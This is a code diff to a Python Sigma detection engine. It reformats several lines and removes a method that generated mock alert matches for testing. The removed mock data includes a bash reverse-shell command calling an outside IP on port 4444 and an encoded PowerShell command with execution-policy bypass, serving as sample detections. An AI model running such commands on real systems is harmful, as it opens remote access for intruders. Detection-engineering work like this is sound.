@@ -313,8 +313,7 @@ class SigmaEngine:
         ]
 
         logger.info(
-            "Sigma search for rule %s: %d real alert match(es) "
-            "(%d alerts scanned)",
+            "Sigma search for rule %s: %d real alert match(es) " "(%d alerts scanned)",
             rule_id,
             len(matches),
             alerts_scanned,
@@ -324,8 +323,7 @@ class SigmaEngine:
             "rule_id": rule_id,
             "rule_title": rule.title,
             "rule_level": rule.level,
-            "sql_query": rule.generated_sql
-            or self.rule_to_sql(rule.to_dict()),
+            "sql_query": rule.generated_sql or self.rule_to_sql(rule.to_dict()),
             "searched_hours": hours,
             "total_matches": len(matches),
             "alerts_scanned": alerts_scanned,
@@ -337,14 +335,29 @@ class SigmaEngine:
     def _rule_keywords(rule: SigmaRule) -> list[str]:
         """Extract search keywords from a rule title and MITRE techniques."""
         stopwords = {
-            "the", "a", "an", "of", "via", "and", "or", "in", "on", "with",
-            "for", "to", "from", "by", "suspicious", "potential", "possible",
-            "detected", "activity", "attack",
+            "the",
+            "a",
+            "an",
+            "of",
+            "via",
+            "and",
+            "or",
+            "in",
+            "on",
+            "with",
+            "for",
+            "to",
+            "from",
+            "by",
+            "suspicious",
+            "potential",
+            "possible",
+            "detected",
+            "activity",
+            "attack",
         }
         keywords = [
-            w
-            for w in rule.title.lower().split()
-            if len(w) > 3 and w not in stopwords
+            w for w in rule.title.lower().split() if len(w) > 3 and w not in stopwords
         ]
         techniques = [t for t in rule.mitre_techniques if t]
         return (techniques + keywords)[:8] or [rule.title.lower()]
@@ -376,130 +389,6 @@ class SigmaEngine:
         }
         return category_table.get(category, "security_events")
 
-    def _generate_mock_matches(self, rule: SigmaRule, hours: int) -> list[dict]:
-        base_time = datetime.now().isoformat()
-        matches = []
-
-        title = rule.title.lower()
-        techniques = str(rule.mitre_techniques).lower()
-
-        if "powershell" in title or "t1059" in techniques:
-            matches.extend(
-                [
-                    {
-                        "id": "evt-001",
-                        "timestamp": base_time,
-                        "hostname": "WIN-DC01",
-                        "username": "svc_backup",
-                        "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...",
-                        "process_id": 4567,
-                        "severity": rule.level,
-                    },
-                    {
-                        "id": "evt-002",
-                        "timestamp": base_time,
-                        "hostname": "WIN-WEB02",
-                        "username": "iis_apppool",
-                        "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\temp\\script.ps1",
-                        "process_id": 8921,
-                        "severity": "medium",
-                    },
-                ]
-            )
-        elif "kerberoast" in title or "t1558" in techniques:
-            matches.append(
-                {
-                    "id": "evt-001",
-                    "timestamp": base_time,
-                    "hostname": "WIN-CLIENT05",
-                    "username": "jdoe",
-                    "service_name": "MSSQLSvc/sql01.domain.local",
-                    "ticket_encryption": "RC4-HMAC",
-                    "event_id": 4769,
-                    "severity": "high",
-                }
-            )
-        elif "reverse shell" in title:
-            matches.append(
-                {
-                    "id": "evt-001",
-                    "timestamp": base_time,
-                    "hostname": "WEB-PROD-03",
-                    "username": "www-data",
-                    "cmdline": "bash -i >& /dev/tcp/45.33.32.156/4444 0>&1",
-                    "pid": 32145,
-                    "severity": "critical",
-                }
-            )
-        elif "k8s" in rule.category or "kubernetes" in rule.category:
-            matches.append(
-                {
-                    "id": "evt-001",
-                    "timestamp": base_time,
-                    "cluster": "prod-eks-01",
-                    "namespace": "default",
-                    "pod": "suspicious-job-7d8f9",
-                    "container": "alpine-shell",
-                    "action": rule.title.split(" ")[0] if rule.title else "exec",
-                    "user": "system:anonymous",
-                    "severity": "critical",
-                }
-            )
-        elif "cloud" in rule.category:
-            matches.append(
-                {
-                    "id": "evt-001",
-                    "timestamp": base_time,
-                    "cloud": rule.logsource.get("product", "aws"),
-                    "action": rule.title.split(" ")[0] if rule.title else "unknown",
-                    "resource": "IAM/access-key",
-                    "source_ip": "203.0.113.50",
-                    "severity": rule.level,
-                }
-            )
-        elif "linux" in rule.category:
-            matches.append(
-                {
-                    "id": "evt-001",
-                    "timestamp": base_time,
-                    "hostname": "WEB-PROD-01",
-                    "comm": "bash",
-                    "uid": 1000,
-                    "syscall": 59,
-                    "key": "execve",
-                    "description": f"Match: {rule.title}",
-                    "severity": rule.level,
-                }
-            )
-        elif "windows" in rule.category:
-            matches.append(
-                {
-                    "id": "evt-001",
-                    "timestamp": base_time,
-                    "hostname": "WIN-DC01",
-                    "event_id": 4698,
-                    "description": f"Match for: {rule.title}",
-                    "severity": rule.level,
-                }
-            )
-        else:
-            matches.append(
-                {
-                    "id": "evt-001",
-                    "timestamp": base_time,
-                    "hostname": "UNKNOWN-HOST",
-                    "event_type": rule.title,
-                    "description": f"Sigma rule match: {rule.title}",
-                    "severity": rule.level,
-                }
-            )
-
-        return matches
-
-
-# ============================================================
-# Fallback Rules (20 built-in detection rules)
-# ============================================================
 
 FALLBACK_RULES = [
     {
